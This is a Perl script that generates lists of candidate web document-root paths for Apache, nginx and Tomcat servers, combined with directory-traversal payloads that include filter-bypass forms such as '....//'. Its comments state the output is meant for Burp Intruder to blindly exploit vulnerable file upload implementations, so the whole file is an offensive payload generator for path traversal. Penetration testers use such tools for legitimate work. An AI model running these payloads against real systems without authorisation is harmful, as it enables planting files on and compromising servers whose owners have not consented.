#!/usr/bin/perl
use strict;

# This little helper script attempts to generate all potential DOCUMENT_ROOT full paths for a given application.
# Such output is intended for use with tools like Burp Intruder in order to blindly exploit vulnerable file upload implementations.
# Coded by ewilded (February 2016)
# The initial list of directories and their suffixes was taken from sqlmap

# Please keep in mind to provide relevant configuration below.
# It is important to specify both short and long name of the target, as its DOC_ROOT is highly likely derived from that value.

# CONFIG SECTION STARTS HERE

my $filename='test.html';
my @targets=('example.org','example','EXAMPLE');
my $auto_append_traversals=1; # if set to 1, include traversal versions of the document root payloads as well
my $auto_append_filename=1;   # if set to 1, automatically append the specified filename to each payload
my $auto_append_pure_traversals=1; # if set to 1, include the relative (docroot independant) traversal payloads as well (the ones to jump out from unknown upload directories located inside the document root)

my @traversals=('',
'./../../../../../../../../',
'./....//....//....//....//....//....//....//....//',
'..//...//...//...//...//...//...//...//...//');

my @pure_traversals=(
'./../',
'./../../',
'./../../../',
'./../../../../',
'./../../../../../',
'./../../../../../../',
'./../../../../../../../',
'./../../../../../../../../',
'./....//....//',
'./....//....//....//',
'./....//....//....//....//',
'./....//....//....//....//....//',
'./....//....//....//....//....//....//',
'./....//....//....//....//....//....//....//',
'./....//....//....//....//....//....//....//....//',
'./...//...//',
'./...//...//...//',
'./...//...//...//...//',
'./...//...//...//...//...//',
'./...//...//...//...//...//...//',
'./...//...//...//...//...//...//...//',
'./...//...//...//...//...//...//...//...//'
);

# nix only list, if we know the underlying server platform, we can comment out irrelevant paths below

 #univeresal docroots
my @universal_doc_roots=(
 "/var/www",
 "/usr/local/httpd", 
 "/usr/local/www",
 "/usr/local/httpd/{TARGET}", 
 "/usr/local/www/{TARGET}",
 "/srv/www", 
 "/var/www/html",
 "/var/www/{TARGET}",
 "/srv/www/{TARGET}", 
 "/var/www/html/{TARGET}",
 "/var/www/vhosts/{TARGET}", 
 "/var/www/virtual/{TARGET}", 
 "/var/www/clients/vhosts/{TARGET}", 
 "/var/www/clients/virtual/{TARGET}"
 );
 
 # nginx docroots
my @nginx_doc_roots=("/var/www/nginx-default");

# apache docroots
my @apache_doc_roots = (
 "/usr/local/apache", 
 "/usr/local/apache2", 
  "/usr/local/apache/{TARGET}", 
 "/usr/local/apache2/{TARGET}", 
 "/usr/local/www/apache/{TARGET}", 
 "/usr/local/www/apache24/{TARGET}",
 "/usr/local/{TARGET}/apache/www/apache22/{TARGET}",
 "/usr/local/apache/www/apache22/{TARGET}",
 "/usr/local/{TARGET}/apache/www/apache22/{TARGET}"
 );

# tomcat docroots
my @tomcat_doc_roots=(
 "/usr/local/tomcat/webapps/{TARGET}",
 "/usr/local/tomcat01/webapps/{TARGET}", 
 "/usr/local/tomcat02/webapps/{TARGET}",
 "/opt/tomcat5/{TARGET}",
 "/opt/tomcat6/{TARGET}",
 "/opt/tomcat7/{TARGET}",
 "/opt/tomcat5/webapps/{TARGET}",
 "/opt/tomcat6/webapps/{TARGET}",
 "/opt/tomcat7/webapps/{TARGET}",
 "/opt/tomcat5/webapps",
 "/opt/tomcat6/webapps",
 "/opt/tomcat7/webapps",
 "/var/lib/tomcat7/webapps",
 "/var/lib/tomcat7/webapps/{TARGET}"
 );
 
# Suffixes used in brute force search for web server document root
my @brute_doc_root_suffixes=("", "html", "htdocs", "httpdocs", "php", "public", "src", "site", "build", "web", "data", "sites/all", "www/build");
my @brute_doc_root_prefixes = (@universal_doc_roots, @nginx_doc_roots, @apache_doc_roots, @tomcat_doc_roots);

# END OF THE CONFIG SECTION




my %target_docroots;

foreach my $docroot(@brute_doc_root_prefixes)
{
	foreach my $target(@targets)
	{
		my $new_docroot=$docroot;
		$new_docroot=~s/{TARGET}/$target/g;
		$target_docroots{$new_docroot}=1;
	}
}


foreach my $target(@targets)
{
	push(@brute_doc_root_suffixes,$target);
}





foreach my $brute_force_dir_prefix(keys %target_docroots)
{
  foreach my $brute_force_dir_suffix(@brute_doc_root_suffixes)
  {
    if($auto_append_traversals eq 1)
	{
		foreach my $traversal(@traversals)
		{
			if($auto_append_filename eq 1)
			{
				print "$traversal$brute_force_dir_prefix/$brute_force_dir_suffix/$filename\n";				
			}
			else
			{
				print "$traversal$brute_force_dir_prefix/$brute_force_dir_suffix\n";				
			}
		}
	}
	else
	{
		print "$brute_force_dir_prefix/$brute_force_dir_suffix\n";
	}
  }
}

if($auto_append_pure_traversals eq 1)
{
	foreach my $pure_traversal(@pure_traversals)
	{
		if($auto_append_filename eq 1)
		{
			print "$pure_traversal/$filename\n";
		}
		else
		{
			print "$pure_traversal\n";
		}
	}
}
if($auto_append_filename eq 1)
{
	print "$filename\n";
}
